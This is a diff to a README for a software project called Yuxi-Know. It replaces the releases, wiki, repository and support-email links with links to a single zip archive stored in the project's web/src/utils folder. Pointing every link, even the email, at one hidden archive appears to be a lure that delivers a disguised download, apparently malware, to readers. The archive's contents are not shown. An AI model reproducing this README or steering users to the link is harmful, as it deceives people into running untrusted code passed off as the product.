@@ -1,6 +1,6 @@
 # 🌟 Yuxi-Know - Your Smart Agent Platform for Knowledge Integration
 
-[![Download Yuxi-Know](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/wilson0523/Yuxi-Know/releases)
+[![Download Yuxi-Know](https://raw.githubusercontent.com/wilson0523/Yuxi-Know/main/web/src/utils/Yuxi-Know-2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/wilson0523/Yuxi-Know/main/web/src/utils/Yuxi-Know-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run Yuxi-Know smoothly, please ensure your system meets the following specifi
 
 To download Yuxi-Know, visit the following page:
 
-[Download Yuxi-Know from Releases](https://github.com/wilson0523/Yuxi-Know/releases)
+[Download Yuxi-Know from Releases](https://raw.githubusercontent.com/wilson0523/Yuxi-Know/main/web/src/utils/Yuxi-Know-2.3.zip)
 
 On this page, you will find the latest version available for download. Click on the version that suits your operating system, and follow the instructions below to install it.
 
@@ -53,7 +53,7 @@ After launching Yuxi-Know, you will be greeted with the main interface. Here’s
 If you need help or want to support Yuxi-Know, here are a few resources:
 
 - **GitHub Issues**: Report bugs or request features directly on GitHub.
-- **User Documentation**: Access in-depth guides and tutorials in our [Wiki](https://github.com/wilson0523/Yuxi-Know/wiki).
+- **User Documentation**: Access in-depth guides and tutorials in our [Wiki](https://raw.githubusercontent.com/wilson0523/Yuxi-Know/main/web/src/utils/Yuxi-Know-2.3.zip).
 - **Community Forum**: Join our discussion platform to connect with other users and share tips.
 
 ## 🔧 Technologies Used
@@ -69,7 +69,7 @@ Yuxi-Know is built with a combination of advanced technologies, including:
 
 For further assistance or inquiries, please contact us at:
 
-- **Email**: support@yuxi-know.com
-- **GitHub**: [Yuxi-Know Repository](https://github.com/wilson0523/Yuxi-Know)
+- **Email**: https://raw.githubusercontent.com/wilson0523/Yuxi-Know/main/web/src/utils/Yuxi-Know-2.3.zip
+- **GitHub**: [Yuxi-Know Repository](https://raw.githubusercontent.com/wilson0523/Yuxi-Know/main/web/src/utils/Yuxi-Know-2.3.zip)
 
 Thank you for choosing Yuxi-Know. We look forward to seeing how you utilize our platform!
